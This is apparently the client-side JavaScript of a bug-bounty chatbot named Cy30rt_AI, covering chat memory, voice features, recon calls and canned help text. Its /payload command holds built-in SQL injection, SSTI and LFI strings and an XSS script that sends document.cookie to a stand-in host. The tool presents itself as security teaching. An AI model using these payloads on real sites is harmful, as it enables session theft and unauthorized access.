// Cy30rt_AI - Complete with FULL Conversation Memory + Hausa + Stop Button
// Created by Abdulbasid Yakubu (cy30rt)

const API_URL = "https://cy30rt-ai.onrender.com";

// Global variables
let currentLanguage = "en";
let audioInitialized = false;
let chatHistory = [];
let currentChatId = null;
let recordingStatusDiv = null;
let currentAbortController = null;
let isGenerating = false;

// Voice settings
let voiceSpeed = 1.0;
let voicePitch = 1.0;
let autoPlayEnabled = false;
let voiceReadbackEnabled = false;

// Voice map with Hausa support (ha-NG)
const voiceMap = {
    'en': 'en-US', 'ar': 'ar-SA', 'es': 'es-ES',
    'fr': 'fr-FR', 'de': 'de-DE', 'hi': 'hi-IN',
    'ha': 'ha-NG', 'pt': 'pt-BR', 'ru': 'ru-RU',
    'zh': 'zh-CN', 'ja': 'ja-JP', 'ko': 'ko-KR',
    'tr': 'tr-TR', 'fa': 'fa-IR', 'ur': 'ur-PK'
};

// ============ CONVERSATION MEMORY (PREVIOUS CHAT UNDERSTANDING) ============
let conversationMemory = {};

// Get recent messages for context
function getConversationContext(chatId, lastNMessages = 6) {
    const chat = chatHistory.find(c => c.id === chatId);
    if (!chat || !chat.messages || chat.messages.length === 0) return [];
    
    // Get last N messages for context (user + assistant)
    const recentMessages = chat.messages.slice(-lastNMessages);
    return recentMessages.map(msg => ({
        role: msg.role === 'user' ? 'user' : 'assistant',
        content: msg.content
    }));
}

// Store message in memory
function addToConversationMemory(chatId, role, content) {
    if (!conversationMemory[chatId]) {
        conversationMemory[chatId] = [];
    }
    conversationMemory[chatId].push({ role, content, timestamp: Date.now() });
    
    // Keep only last 100 messages
    if (conversationMemory[chatId].length > 100) {
        conversationMemory[chatId] = conversationMemory[chatId].slice(-100);
    }
}

// Clear memory for a chat
function clearConversationMemory(chatId) {
    if (conversationMemory[chatId]) {
        delete conversationMemory[chatId];
    }
}

// ============ STOP BUTTON FEATURE ============
function stopGeneration() {
    if (currentAbortController) {
        currentAbortController.abort();
        currentAbortController = null;
    }
    isGenerating = false;
    hideTypingIndicator();
    addSystemMessage("⏹️ Response generation stopped by user.");
}

function showStopButton() {
    const stopBtn = document.getElementById("stopBtn");
    if (stopBtn) stopBtn.style.display = "flex";
}

function hideStopButton() {
    const stopBtn = document.getElementById("stopBtn");
    if (stopBtn) stopBtn.style.display = "none";
}

function addSystemMessage(text) {
    const container = document.getElementById("messagesContainer");
    if (!container) return;
    const sysDiv = document.createElement("div");
    sysDiv.className = "message system";
    sysDiv.innerHTML = `<div class="message-avatar">ℹ️</div><div class="message-content"><div class="message-text" style="background: rgba(59,130,246,0.1); text-align: center; font-size: 0.85rem;">${escapeHtml(text)}</div></div>`;
    container.appendChild(sysDiv);
    scrollToBottom();
}

// ============ CHAT HISTORY ============
function initChatHistory() {
    const saved = localStorage.getItem("cy30rt_chats");
    if (saved) {
        try {
            chatHistory = JSON.parse(saved);
        } catch (e) { chatHistory = []; }
    }
    
    // Load saved conversation memory
    const savedMemory = localStorage.getItem("cy30rt_memory");
    if (savedMemory) {
        try {
            conversationMemory = JSON.parse(savedMemory);
        } catch(e) {}
    }

    if (chatHistory.length === 0) {
        createNewChat();
    } else {
        currentChatId = chatHistory[0].id;
        loadCurrentChat();
    }
    renderHistoryList();
}

function saveChats() {
    localStorage.setItem("cy30rt_chats", JSON.stringify(chatHistory));
    localStorage.setItem("cy30rt_memory", JSON.stringify(conversationMemory));
}

function createNewChat() {
    const newId = Date.now().toString();
    const newChat = {
        id: newId,
        title: "New Chat",
        messages: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString()
    };
    chatHistory.unshift(newChat);
    currentChatId = newId;
    saveChats();
    renderHistoryList();
    loadCurrentChat();
}

function switchChat(chatId) {
    currentChatId = chatId;
    loadCurrentChat();
    renderHistoryList();
}

function loadCurrentChat() {
    const chat = chatHistory.find(c => c.id === currentChatId);
    const container = document.getElementById("messagesContainer");
    if (!container) return;

    if (!chat || chat.messages.length === 0) {
        container.innerHTML = getWelcomeHTML();
        return;
    }

    container.innerHTML = '';
    chat.messages.forEach(msg => {
        if (msg.role === 'user') {
            addMessageToUI('user', msg.content, msg.timestamp);
        } else if (msg.role === 'assistant') {
            addMessageToUI('assistant', msg.content, msg.timestamp);
        }
    });
    scrollToBottom();
}

function renderHistoryList() {
    const historyList = document.getElementById("historyList");
    if (!historyList) return;

    if (chatHistory.length === 0) {
        historyList.innerHTML = '<div style="padding: 12px; text-align: center; color: #666;">No chats yet</div>';
        return;
    }

    historyList.innerHTML = chatHistory.map(chat => `
        <div class="history-item ${currentChatId === chat.id ? 'active' : ''}" onclick="switchChat('${chat.id}')">
            ${escapeHtml(chat.title.substring(0, 30))}
        </div>
    `).join('');
}

function addMessageToCurrentChat(role, content) {
    const chat = chatHistory.find(c => c.id === currentChatId);
    if (!chat) return;

    chat.messages.push({
        role: role,
        content: content,
        timestamp: new Date().toISOString()
    });
    chat.updatedAt = new Date().toISOString();
    
    // Add to conversation memory for context
    addToConversationMemory(currentChatId, role, content);

    if (role === 'user' && chat.messages.length === 1) {
        chat.title = content.substring(0, 30) + (content.length > 30 ? '...' : '');
    }

    saveChats();
    renderHistoryList();
}

function getWelcomeHTML() {
    return `
        <div class="welcome-screen">
            <div class="welcome-icon">🤖</div>
            <h1>Cy30rt_AI</h1>
            <p>Your cybersecurity & bug bounty assistant<br><span style="font-size: 0.8rem;">💡 I remember our conversation! You can ask follow-up questions.</span></p>
            <div class="example-prompts">
                <button class="example-btn" onclick="sendExample('What is SQL injection?')">Learn SQLi</button>
                <button class="example-btn" onclick="sendExample('/recon scanme.nmap.org')">Run Recon</button>
                <button class="example-btn" onclick="sendExample('/payload xss')">Get Payloads</button>
                <button class="example-btn" onclick="sendExample('/cve CVE-2024-6387')">Look up CVE</button>
            </div>
            <div class="creator-note">
                Created by Abdulbasid Yakubu (cy30rt) | Type /help for all commands
            </div>
        </div>
    `;
}

function addMessageToUI(role, content, timestamp = null) {
    const container = document.getElementById("messagesContainer");
    const timeStr = timestamp ? new Date(timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
    const messageDiv = document.createElement("div");
    messageDiv.className = `message ${role}`;
    messageDiv.innerHTML = `
        <div class="message-avatar">${role === 'user' ? 'U' : 'AI'}</div>
        <div class="message-content">
            <div class="message-header">
                <span class="message-sender">${role === 'user' ? 'You' : 'Cy30rt_AI'}</span>
                <span class="message-time">${timeStr}</span>
            </div>
            <div class="message-text">${formatMessage(escapeHtml(content))}</div>
        </div>
    `;
    container.appendChild(messageDiv);
    scrollToBottom();
}

function formatMessage(text) {
    text = text.replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>');
    text = text.replace(/`([^`]+)`/g, '<code>$1</code>');
    text = text.replace(/\n/g, '<br>');
    return text;
}

// ============ TYPING ANIMATION ============
async function typeMessage(element, text) {
    element.innerHTML = '';
    const chars = text.split('');
    for (let i = 0; i < chars.length; i++) {
        if (!isGenerating) break;
        element.innerHTML += chars[i];
        await sleep(10);
        scrollToBottom();
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ============ API CALL WITH CANCEL SUPPORT AND CONTEXT ============
async function apiCall(endpoint, options) {
    if (currentAbortController) {
        currentAbortController.abort();
    }
    
    currentAbortController = new AbortController();
    isGenerating = true;
    showStopButton();
    
    try {
        const response = await fetch(`${API_URL}${endpoint}`, {
            ...options,
            signal: currentAbortController.signal
        });
        return response;
    } catch (error) {
        if (error.name === 'AbortError') {
            throw new Error('CANCELLED');
        }
        throw error;
    } finally {
        isGenerating = false;
        hideStopButton();
        currentAbortController = null;
    }
}

// ============ RECONIX INTEGRATION ============
async function runReconix(target, options = {}) {
    const container = document.getElementById("messagesContainer");
    const statusDiv = document.createElement("div");
    statusDiv.className = "message assistant";
    const messageId = 'recon_' + Date.now();
    statusDiv.id = messageId;
    statusDiv.innerHTML = `
        <div class="message-avatar">🔍</div>
        <div class="message-content">
            <div class="message-header">
                <span class="message-sender">Recon Engine</span>
                <span class="message-time">${new Date().toLocaleTimeString()}</span>
            </div>
            <div class="message-text" id="reconStatus_${messageId}">
                🚀 Starting reconnaissance on ${target}...
            </div>
        </div>
    `;
    container.appendChild(statusDiv);
    scrollToBottom();

    try {
        const response = await apiCall('/api/recon', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ target: target, options: options })
        });

        const data = await response.json();
        const statusText = document.getElementById(`reconStatus_${messageId}`);

        if (data.success) {
            let resultText = `✅ **Recon Complete - ${target}**\n\n`;
            resultText += `📊 **Summary:**\n`;
            resultText += `• Subdomains found: ${data.summary.subdomains_found}\n`;
            resultText += `• Technologies detected: ${data.summary.technologies_found}\n`;
            resultText += `• Endpoints discovered: ${data.summary.endpoints_found}\n`;
            resultText += `• Secrets found: ${data.summary.secrets_found}\n`;
            resultText += `• Vulnerabilities: ${data.summary.vulnerabilities_found}\n\n`;

            if (data.findings.subdomains.length > 0) {
                resultText += `🔹 **Subdomains:**\n`;
                data.findings.subdomains.slice(0, 10).forEach(s => resultText += `  • ${s}\n`);
                resultText += `\n`;
            }

            if (data.findings.technologies.length > 0) {
                resultText += `🔹 **Technologies:**\n`;
                data.findings.technologies.slice(0, 10).forEach(t => resultText += `  • ${t}\n`);
                resultText += `\n`;
            }

            if (data.findings.endpoints.length > 0) {
                resultText += `🔹 **Key Endpoints:**\n`;
                data.findings.endpoints.slice(0, 10).forEach(e => resultText += `  • ${e}\n`);
                resultText += `\n`;
            }

            if (data.findings.secrets.length > 0) {
                resultText += `⚠️ **Potential Secrets Found - Review Carefully!**\n`;
                data.findings.secrets.slice(0, 5).forEach(s => resultText += `  • ${s}\n`);
                resultText += `\n`;
            }

            resultText += `💡 **Next Steps:**\n`;
            resultText += `• Ask me: "Analyze these findings"\n`;
            resultText += `• Run: /payload sqli for SQL injection payloads\n`;
            resultText += `• Check subdomains with /recon [subdomain]\n\n`;
            resultText += `⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI`;

            if (statusText) {
                statusText.innerHTML = formatMessage(escapeHtml(resultText));
            }
            return data.output;
        } else {
            if (statusText) {
                statusText.innerHTML = `❌ **Error:** ${escapeHtml(data.error)}\n\nMake sure Reconix is installed on the server.`;
            }
            return null;
        }
    } catch (error) {
        const statusText = document.getElementById(`reconStatus_${messageId}`);
        if (statusText && error.message !== 'CANCELLED') {
            statusText.innerHTML = `❌ **Error:** ${escapeHtml(error.message)}`;
        }
        return null;
    }
}

// ============ SEND MESSAGE WITH CONTEXT MEMORY ============
async function sendMessage() {
    const input = document.getElementById("messageInput");
    let message = input.value.trim();
    if (!message) return;

    input.value = "";
    input.style.height = "auto";

    const container = document.getElementById("messagesContainer");
    if (container.querySelector(".welcome-screen")) {
        container.innerHTML = '';
    }

    addMessageToUI('user', message);
    addMessageToCurrentChat('user', message);

    showTypingIndicator();

    try {
        // Get conversation context for understanding (PREVIOUS CHAT MEMORY)
        const context = getConversationContext(currentChatId, 8);
        
        // Log context for debugging
        if (context.length > 0) {
            console.log("📚 Conversation context loaded:", context.length, "previous messages");
        }

        // Check for recon commands
        let isReconCommand = false;
        let target = null;
        let options = {};

        if (message.startsWith('/recon')) {
            target = message.replace('/recon', '').trim();
            isReconCommand = true;
            options = {
                deep: message.includes('--deep') || message.includes('deep'),
                js: message.includes('--js') || message.includes('javascript'),
                historical: message.includes('--historical') || message.includes('wayback'),
                aggressive: message.includes('--aggressive') || message.includes('full'),
                threads: 20
            };
        } else if (message.toLowerCase().includes('run recon on')) {
            target = message.toLowerCase().replace('run recon on', '').trim();
            isReconCommand = true;
            options = { deep: true, js: true, historical: true, threads: 20 };
        } else if (message.toLowerCase().match(/scan\s+([a-z0-9.-]+)/)) {
            const match = message.toLowerCase().match(/scan\s+([a-z0-9.-]+)/);
            if (match) {
                target = match[1];
                isReconCommand = true;
                options = { deep: true, js: true, historical: true, threads: 20 };
            }
        }

        if (isReconCommand && target) {
            hideTypingIndicator();
            await runReconix(target, options);
            return;
        }

        // Check for payload commands
        if (message.startsWith('/payload')) {
            const type = message.replace('/payload', '').trim().toLowerCase();
            const payloads = {
                'sqli': `💉 **SQL Injection Payloads**\n\n**Authentication Bypass:**\n' OR '1'='1' --\nadmin' --\n' OR 1=1--\n\n**Union-Based:**\n' UNION SELECT null, username, password FROM users--\n' UNION SELECT 1,2,3,4,5--\n\n**Time-Based:**\n' AND SLEEP(5)--\n' OR IF(1=1, SLEEP(5), 0)--`,
                'xss': `🔓 **XSS Payloads**\n\n**Basic Alert:**\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n**Cookie Stealing:**\n<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>`,
                'ssti': `🧠 **SSTI Payloads**\n\n**Jinja2 (Python):**\n{{7*7}}\n{{config}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
                'lfi': `📂 **LFI/RFI Payloads**\n\n**Basic LFI:**\n../../../../etc/passwd\n../../../etc/passwd%00\nphp://filter/convert.base64-encode/resource=index.php`
            };

            if (type && payloads[type]) {
                hideTypingIndicator();
                const messageDiv = document.createElement("div");
                messageDiv.className = "message assistant";
                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
                container.appendChild(messageDiv);
                const textDiv = messageDiv.querySelector(".message-text");
                await typeMessage(textDiv, payloads[type]);
                addMessageToCurrentChat('assistant', payloads[type]);
                if (autoPlayEnabled) textToSpeech(payloads[type], currentLanguage);
                addAudioControls(messageDiv, payloads[type], currentLanguage);
                return;
            }
        }

        // Check for CVE command
        if (message.startsWith('/cve')) {
            const cveId = message.replace('/cve', '').trim().toUpperCase();
            if (cveId) {
                const cveResponse = `🔍 **CVE Intelligence: ${cveId}**\n\nSearching for ${cveId}...\n\nThis CVE lookup provides:\n• Vulnerability description\n• CVSS score (severity rating)\n• Affected software versions\n• Public exploits available\n• Mitigation steps\n\nWould you like me to analyze specific CVEs? Try /cve CVE-2024-6387 (OpenSSH)`;
                hideTypingIndicator();
                const messageDiv = document.createElement("div");
                messageDiv.className = "message assistant";
                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
                container.appendChild(messageDiv);
                const textDiv = messageDiv.querySelector(".message-text");
                await typeMessage(textDiv, cveResponse);
                addMessageToCurrentChat('assistant', cveResponse);
                if (autoPlayEnabled) textToSpeech(cveResponse, currentLanguage);
                addAudioControls(messageDiv, cveResponse, currentLanguage);
                return;
            }
        }

        // Check for help command
        if (message === '/help' || message === '/commands') {
            const helpResponse = `🤖 **Cy30rt_AI Complete Commands**\n\n📚 **LEARNING MODE:**\n/learn sqli - SQL injection tutorial\n/learn xss - XSS tutorial\n/learn ssti - SSTI tutorial\n\n🔍 **BUG BOUNTY MODE:**\n/recon <target> - Run automated reconnaissance\n/payload <type> - Generate payloads (sqli, xss, ssti, lfi)\n/cve <id> - Look up CVE information\n\n💬 **GENERAL:**\n/help - Show this help\n/who - About the creator\n/new - Start new chat\n\n💡 **CONVERSATION MEMORY:**\nI remember our previous messages! You can ask follow-up questions like "What about XSS?" after learning about SQLi.\n\n⚠️ Always test only on authorized targets!\n\nStay secure. - Cy30rt_AI`;
            hideTypingIndicator();
            const messageDiv = document.createElement("div");
            messageDiv.className = "message assistant";
            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
            container.appendChild(messageDiv);
            const textDiv = messageDiv.querySelector(".message-text");
            await typeMessage(textDiv, helpResponse);
            addMessageToCurrentChat('assistant', helpResponse);
            if (autoPlayEnabled) textToSpeech(helpResponse, currentLanguage);
            addAudioControls(messageDiv, helpResponse, currentLanguage);
            return;
        }

        // Check for who command
        if (message === '/who' || message === '/creator' || message === '/about') {
            const whoResponse = `🤖 **Cy30rt_AI**\n\nI am a professional cybersecurity and bug bounty assistant created by **Abdulbasid Yakubu (cy30rt)** , a cybersecurity professional dedicated to making security education accessible.\n\n**My capabilities:**\n• Teach cybersecurity concepts\n• Run reconnaissance on authorized targets (Reconix)\n• Generate attack payloads\n• Look up CVE information\n• 15 languages support\n• Voice interaction with adjustable speed\n• **Remember previous conversations** - ask follow-up questions!\n\n⚠️ Always practice on authorized systems only!\n\nStay secure. - Cy30rt_AI`;
            hideTypingIndicator();
            const messageDiv = document.createElement("div");
            messageDiv.className = "message assistant";
            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
            container.appendChild(messageDiv);
            const textDiv = messageDiv.querySelector(".message-text");
            await typeMessage(textDiv, whoResponse);
            addMessageToCurrentChat('assistant', whoResponse);
            if (autoPlayEnabled) textToSpeech(whoResponse, currentLanguage);
            addAudioControls(messageDiv, whoResponse, currentLanguage);
            return;
        }

        // Check for new chat command
        if (message === '/new' || message === '/clear') {
            createNewChat();
            hideTypingIndicator();
            return;
        }

        // Check for learn command
        if (message.startsWith('/learn')) {
            const topic = message.replace('/learn', '').trim().toLowerCase();
            const lessons = {
                'sqli': `📚 **SQL Injection Lesson**\n\n**What is SQL Injection?**\nSQL injection occurs when user input is inserted directly into SQL queries without sanitization.\n\n**How it works:**\nNormal query: SELECT * FROM users WHERE username='admin' AND password='pass'\nMalicious input: admin' --\nResult: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'\n\n**Test payloads:** /payload sqli\n\n💡 Ask me: "How to prevent SQL injection?" after this!`,
                'xss': `📚 **XSS Lesson**\n\n**What is Cross-Site Scripting?**\nInjecting malicious JavaScript into web pages.\n\n**Types:**\n1. Reflected XSS\n2. Stored XSS\n3. DOM-based XSS\n\n**Test payloads:** /payload xss\n\n💡 Ask me: "What's the difference between reflected and stored XSS?"`,
                'ssti': `📚 **SSTI Lesson**\n\n**What is Server-Side Template Injection?**\nAttacker injects template engine code into server-side rendering.\n\n**Detection:**\nTry {{7*7}} or ${7*7} - if you see 49, SSTI exists!\n\n**Test payloads:** /payload ssti`
            };

            if (topic && lessons[topic]) {
                hideTypingIndicator();
                const messageDiv = document.createElement("div");
                messageDiv.className = "message assistant";
                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
                container.appendChild(messageDiv);
                const textDiv = messageDiv.querySelector(".message-text");
                await typeMessage(textDiv, lessons[topic]);
                addMessageToCurrentChat('assistant', lessons[topic]);
                if (autoPlayEnabled) textToSpeech(lessons[topic], currentLanguage);
                addAudioControls(messageDiv, lessons[topic], currentLanguage);
                return;
            }
        }

        // Use Groq API with conversation context (THIS ENABLES PREVIOUS CHAT UNDERSTANDING)
        const response = await apiCall('/api/chat', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                message: message, 
                language: currentLanguage,
                context: context,  // ← Sends previous messages to backend
                session_id: currentChatId
            })
        });

        if (!response.ok) throw new Error(`HTTP ${response.status}`);

        const data = await response.text();
        hideTypingIndicator();

        const messageDiv = document.createElement("div");
        messageDiv.className = "message assistant";
        messageDiv.innerHTML = `
            <div class="message-avatar">AI</div>
            <div class="message-content">
                <div class="message-header">
                    <span class="message-sender">Cy30rt_AI</span>
                    <span class="message-time">${new Date().toLocaleTimeString()}</span>
                </div>
                <div class="message-text" id="streamingText"></div>
            </div>
        `;
        container.appendChild(messageDiv);

        const textDiv = messageDiv.querySelector(".message-text");
        await typeMessage(textDiv, data);

        addMessageToCurrentChat('assistant', data);

        if (autoPlayEnabled) {
            textToSpeech(data, currentLanguage);
        }

        addAudioControls(messageDiv, data, currentLanguage);

    } catch (error) {
        hideTypingIndicator();
        console.error(error);
        if (error.message !== 'CANCELLED') {
            addErrorMessage(error.message);
        }
    }
}

function sendExample(prompt) {
    document.getElementById("messageInput").value = prompt;
    sendMessage();
}

function addErrorMessage(error) {
    const container = document.getElementById("messagesContainer");
    const errorDiv = document.createElement("div");
    errorDiv.className = "message assistant";
    errorDiv.innerHTML = `
        <div class="message-avatar">!</div>
        <div class="message-content">
            <div class="message-header">
                <span class="message-sender">Error</span>
                <span class="message-time">${new Date().toLocaleTimeString()}</span>
            </div>
            <div class="message-text" style="color: #ef4444;">Error: ${escapeHtml(error)}</div>
        </div>
    `;
    container.appendChild(errorDiv);
    scrollToBottom();
}

function addAudioControls(messageDiv, text, language) {
    const existing = messageDiv.querySelector(".audio-controls");
    if (existing) existing.remove();

    const controlsDiv = document.createElement("div");
    controlsDiv.className = "audio-controls";

    const playBtn = document.createElement("button");
    playBtn.className = "audio-btn";
    playBtn.textContent = "Play Audio";

    const stopBtn = document.createElement("button");
    stopBtn.className = "audio-btn";
    stopBtn.textContent = "Stop";

    let isPlaying = false;

    playBtn.onclick = async() => {
        if (isPlaying) {
            window.speechSynthesis.cancel();
            playBtn.textContent = "Play Audio";
            isPlaying = false;
            return;
        }
        playBtn.textContent = "Playing...";
        isPlaying = true;
        await textToSpeech(text, language);
        playBtn.textContent = "Play Audio";
        isPlaying = false;
    };

    stopBtn.onclick = () => {
        window.speechSynthesis.cancel();
        playBtn.textContent = "Play Audio";
        isPlaying = false;
    };

    controlsDiv.appendChild(playBtn);
    controlsDiv.appendChild(stopBtn);
    messageDiv.querySelector(".message-content").appendChild(controlsDiv);
}

function initAudio() {
    if (audioInitialized) return;
    try {
        const silent = new SpeechSynthesisUtterance("");
        silent.volume = 0;
        window.speechSynthesis.speak(silent);
        audioInitialized = true;
    } catch (e) {}
}

async function textToSpeech(text, languageCode) {
    return new Promise((resolve) => {
        if (!window.speechSynthesis) { resolve(false); return; }
        initAudio();
        window.speechSynthesis.cancel();
        const cleanText = text.replace(/[\[\]\(\)\*\_\#]/g, '').substring(0, 1500);
        const utterance = new SpeechSynthesisUtterance(cleanText);
        if (languageCode === 'ha') {
            utterance.lang = 'ha-NG';
        } else {
            utterance.lang = voiceMap[languageCode] || 'en-US';
        }
        utterance.rate = voiceSpeed;
        utterance.pitch = voicePitch;
        utterance.onend = () => resolve(true);
        utterance.onerror = () => resolve(false);
        window.speechSynthesis.speak(utterance);
    });
}

function setupVoiceInput() {
    const voiceBtn = document.getElementById("voiceBtn");
    if (!voiceBtn) return;

    const SpeechRecognition = window.webkitSpeechRecognition || window.SpeechRecognition;
    if (!SpeechRecognition) { voiceBtn.style.opacity = "0.5"; return; }

    const recognition = new SpeechRecognition();
    recognition.continuous = false;
    recognition.interimResults = false;

    voiceBtn.onclick = () => {
        initAudio();
        if (currentLanguage === 'ha') {
            recognition.lang = 'ha-NG';
        } else if (currentLanguage === 'ar') {
            recognition.lang = 'ar-SA';
        } else {
            recognition.lang = 'en-US';
        }
        recognition.start();
        voiceBtn.classList.add("recording");
        showRecordingStatus();
    };

    recognition.onresult = (event) => {
        const text = event.results[0][0].transcript;
        document.getElementById("messageInput").value = text;
        sendMessage();
        voiceBtn.classList.remove("recording");
        hideRecordingStatus();
    };

    recognition.onerror = () => { voiceBtn.classList.remove("recording");
        hideRecordingStatus(); };
    recognition.onend = () => { voiceBtn.classList.remove("recording");
        hideRecordingStatus(); };
}

function showRecordingStatus() {
    if (recordingStatusDiv) recordingStatusDiv.remove();
    recordingStatusDiv = document.createElement("div");
    recordingStatusDiv.className = "recording-status";
    recordingStatusDiv.innerHTML = '🎙️ Recording... Speak now';
    document.body.appendChild(recordingStatusDiv);
    setTimeout(() => { if (recordingStatusDiv) recordingStatusDiv.remove(); }, 10000);
}

function hideRecordingStatus() {
    if (recordingStatusDiv) { recordingStatusDiv.remove();
        recordingStatusDiv = null; }
}

function showTypingIndicator() {
    const indicator = document.getElementById("typingIndicator");
    if (indicator) indicator.style.display = "flex";
    scrollToBottom();
}

function hideTypingIndicator() {
    const indicator = document.getElementById("typingIndicator");
    if (indicator) indicator.style.display = "none";
}

function scrollToBottom() {
    const chatArea = document.getElementById("chatArea");
    if (chatArea) chatArea.scrollTop = chatArea.scrollHeight;
}

function escapeHtml(text) {
    const div = document.createElement("div");
    div.textContent = text;
    return div.innerHTML;
}

function loadSettings() {
    autoPlayEnabled = localStorage.getItem("auto_play") === "true";
    voiceReadbackEnabled = localStorage.getItem("voice_readback") === "true";
    voiceSpeed = parseFloat(localStorage.getItem("voice_speed") || "1.0");
    voicePitch = parseFloat(localStorage.getItem("voice_pitch") || "1.0");

    const autoToggle = document.getElementById("autoPlayToggle");
    const readbackToggle = document.getElementById("voiceReadbackToggle");
    const speedSlider = document.getElementById("voiceSpeed");
    const pitchSlider = document.getElementById("voicePitch");
    const speedVal = document.getElementById("speedValue");
    const pitchVal = document.getElementById("pitchValue");

    if (autoToggle) autoToggle.checked = autoPlayEnabled;
    if (readbackToggle) readbackToggle.checked = voiceReadbackEnabled;
    if (speedSlider) speedSlider.value = voiceSpeed;
    if (pitchSlider) pitchSlider.value = voicePitch;
    if (speedVal) speedVal.textContent = voiceSpeed === 1.0 ? "Normal" : `${voiceSpeed.toFixed(1)}x`;
    if (pitchVal) pitchVal.textContent = voicePitch === 1.0 ? "Normal" : `${voicePitch.toFixed(1)}x`;
}

function saveSettings() {
    autoPlayEnabled = document.getElementById("autoPlayToggle")?.checked || false;
    voiceReadbackEnabled = document.getElementById("voiceReadbackToggle")?.checked || false;
    voiceSpeed = parseFloat(document.getElementById("voiceSpeed")?.value || "1.0");
    voicePitch = parseFloat(document.getElementById("voicePitch")?.value || "1.0");

    localStorage.setItem("auto_play", autoPlayEnabled);
    localStorage.setItem("voice_readback", voiceReadbackEnabled);
    localStorage.setItem("voice_speed", voiceSpeed);
    localStorage.setItem("voice_pitch", voicePitch);

    const speedVal = document.getElementById("speedValue");
    const pitchVal = document.getElementById("pitchValue");
    if (speedVal) speedVal.textContent = voiceSpeed === 1.0 ? "Normal" : `${voiceSpeed.toFixed(1)}x`;
    if (pitchVal) pitchVal.textContent = voicePitch === 1.0 ? "Normal" : `${voicePitch.toFixed(1)}x`;
}

function showSettingsModal() { document.getElementById("settingsModal").classList.add("active"); }
function closeSettingsModal() { document.getElementById("settingsModal").classList.remove("active"); }
function showLanguageModal() { document.getElementById("languageModal").classList.add("active"); }
function closeLanguageModal() { document.getElementById("languageModal").classList.remove("active"); }

function changeLanguage(langCode) {
    currentLanguage = langCode;
    localStorage.setItem("cy30rt_language", langCode);
    closeLanguageModal();
    addSystemMessage(`Language changed to ${LANGUAGES[langCode].name}`);
}

function renderLanguageGrid() {
    const grid = document.getElementById("languageModalGrid");
    if (!grid || typeof LANGUAGES === 'undefined') return;
    grid.innerHTML = "";
    grid.className = "language-grid";
    Object.entries(LANGUAGES).forEach(([code, lang]) => {
        const btn = document.createElement("div");
        btn.className = "language-item";
        btn.onclick = () => changeLanguage(code);
        btn.innerHTML = `
            <div class="language-flag">${lang.flag}</div>
            <div class="language-name">${lang.name}</div>
            <div class="language-native">${lang.native}</div>
        `;
        grid.appendChild(btn);
    });
}

function toggleMobileMenu() {
    document.getElementById("sidebar").classList.toggle("open");
}

document.addEventListener("DOMContentLoaded", () => {
    console.log("Cy30rt_AI Ready - With FULL Conversation Memory, Hausa, and Stop Button");

    initChatHistory();
    loadSettings();
    renderLanguageGrid();

    document.getElementById("sendBtn")?.addEventListener("click", sendMessage);
    document.getElementById("stopBtn")?.addEventListener("click", stopGeneration);
    document.getElementById("settingsBtn")?.addEventListener("click", showSettingsModal);
    document.getElementById("languageBtn")?.addEventListener("click", showLanguageModal);
    document.getElementById("mobileMenuBtn")?.addEventListener("click", toggleMobileMenu);
    document.getElementById("newChatBtn")?.addEventListener("click", createNewChat);

    document.getElementById("messageInput")?.addEventListener("keypress", (e) => {
        if (e.key === "Enter" && !e.shiftKey) {
            e.preventDefault();
            sendMessage();
        }
    });

    document.getElementById("messageInput")?.addEventListener("input", function(e) {
        e.target.style.height = "auto";
        e.target.style.height = Math.min(e.target.scrollHeight, 120) + "px";
    });

    document.querySelector(".modal-close")?.addEventListener("click", closeLanguageModal);
    document.querySelector(".modal-close-settings")?.addEventListener("click", closeSettingsModal);

    document.getElementById("autoPlayToggle")?.addEventListener("change", saveSettings);
    document.getElementById("voiceReadbackToggle")?.addEventListener("change", saveSettings);
    document.getElementById("voiceSpeed")?.addEventListener("input", saveSettings);
    document.getElementById("voicePitch")?.addEventListener("input", saveSettings);

    setupVoiceInput();

    window.onclick = (event) => {
        if (event.target === document.getElementById("languageModal")) closeLanguageModal();
        if (event.target === document.getElementById("settingsModal")) closeSettingsModal();
    };

    if (document.getElementById("sidebar")) {
        document.addEventListener("click", function(e) {
            const sidebar = document.getElementById("sidebar");
            const menuBtn = document.getElementById("mobileMenuBtn");
            if (sidebar && sidebar.classList.contains("open") && !sidebar.contains(e.target) && e.target !== menuBtn) {
                sidebar.classList.remove("open");
            }
        });
    }

    const savedLang = localStorage.getItem("cy30rt_language");
    if (savedLang && typeof LANGUAGES !== 'undefined' && LANGUAGES[savedLang]) {
        currentLanguage = savedLang;
    }
    
    console.log("💡 Conversation Memory Active - I remember our previous messages!");
});

window.switchChat = switchChat;
window.sendExample = sendExample;
window.stopGeneration = stopGeneration;
